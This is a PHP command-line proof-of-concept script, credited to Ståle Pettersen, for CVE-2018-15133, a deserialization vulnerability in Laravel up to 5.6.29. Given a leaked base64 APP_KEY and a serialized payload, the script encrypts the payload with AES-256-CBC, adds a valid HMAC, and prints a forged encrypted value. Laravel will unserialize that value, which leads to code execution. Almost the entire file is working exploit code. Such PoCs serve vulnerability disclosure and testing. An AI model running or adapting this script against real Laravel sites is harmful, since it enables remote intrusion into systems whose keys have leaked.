#!/usr/bin/env php
<?php
/**
 * 
 * [CVE-2018-15133] Laravel Framework <= 5.6.29 / <= 5.5.40 / ~ https://github.com/kozmic/laravel-poc-CVE-2018-15133/
 *
 * Author:
 * - Ståle Pettersen ~ https://github.com/kozmic ~ https://twitter.com/kozmic
 */

echo "PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic\n\n";
if ($argc < 3 )
{
    echo "Usage: " . $argv[0] . " <base64encoded_APP_KEY> <base64encoded-payload>" . PHP_EOL;
    exit();
}
$key = $argv[1];
$value = $argv[2];

$cipher = 'AES-256-CBC'; // or 'AES-128-CBC'

$iv = random_bytes(openssl_cipher_iv_length($cipher)); // instead of rolling a dice ;)

$value = \openssl_encrypt(
    base64_decode($value), $cipher, base64_decode($key), 0, $iv
);

if ($value === false) {
    exit("Could not encrypt the data.");
}

$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, base64_decode($key));

$json = json_encode(compact('iv', 'value', 'mac'));

if (json_last_error() !== JSON_ERROR_NONE) {
    echo "Could not json encode data." . PHP_EOL;
    exit();
}

//$encodedPayload = urlencode(base64_encode($json));
$encodedPayload = base64_encode($json);
echo "##".$encodedPayload . "##\n";

